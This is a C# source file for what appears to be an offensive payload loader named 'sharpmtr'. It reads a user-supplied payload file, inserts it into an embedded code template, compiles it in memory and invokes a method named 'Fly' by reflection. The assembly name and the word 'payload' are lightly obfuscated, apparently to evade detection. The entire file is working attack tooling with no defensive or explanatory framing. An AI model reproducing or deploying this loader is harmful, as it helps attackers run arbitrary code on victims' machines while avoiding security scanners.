using Microsoft.CSharp;
using System;
using System.CodeDom.Compiler;
using System.IO;
using System.Reflection;


namespace sharpmtr
{
    public class Program
    {

        static void Main(string[] args)
        {

            if ( args.Length != 1 )
            {
                Console.WriteLine("Usage : program.exe path_to_p4yl04d  ");
                return;
            }
            string filenamepath = args[0];
            if (!File.Exists(filenamepath))
            {
                Console.WriteLine("..dont cheat on me! give me an exisiting file");
                return;
            }            

            CompilerParameters compileParameters = new CompilerParameters();
            string currentDirectory = Directory.GetCurrentDirectory();
            compileParameters.GenerateInMemory = true;
            compileParameters.TreatWarningsAsErrors = false;
            compileParameters.GenerateExecutable = false;
            compileParameters.CompilerOptions = "/optimize";
            compileParameters.ReferencedAssemblies.Add("S" + (char)121 + "s" + (char)84 + "e" + "m" + (char)46 + (char)100 + (char)108 + (char)76);

            string code = System.Text.Encoding.UTF8.GetString(Constants.byteRS);
            string stuff = System.IO.File.ReadAllText(filenamepath);
            code = code.Replace("|STUFF|", stuff );

            CSharpCodeProvider cSharpCompiler = new CSharpCodeProvider();
            CompilerResults compileResults = cSharpCompiler.CompileAssemblyFromSource(compileParameters, code);

            if (compileResults.Errors.HasErrors)
            {
                string text = "comp errors : ";
                foreach (CompilerError compileError in compileResults.Errors)
                {
                    text += "rn " + compileError.ToString();
                }
            }

            Module module = compileResults.CompiledAssembly.GetModules()[0];
            Type type = null;
            MethodInfo methodInfo = null;
            if (module != null)
            {
                type = module.GetType("xcute.apcip");
            }
            if (type != null)
            {
                methodInfo = type.GetMethod("Fly");
            }
            if (methodInfo != null)
            {
                methodInfo.Invoke(null, null);
            }
        }
    }
}
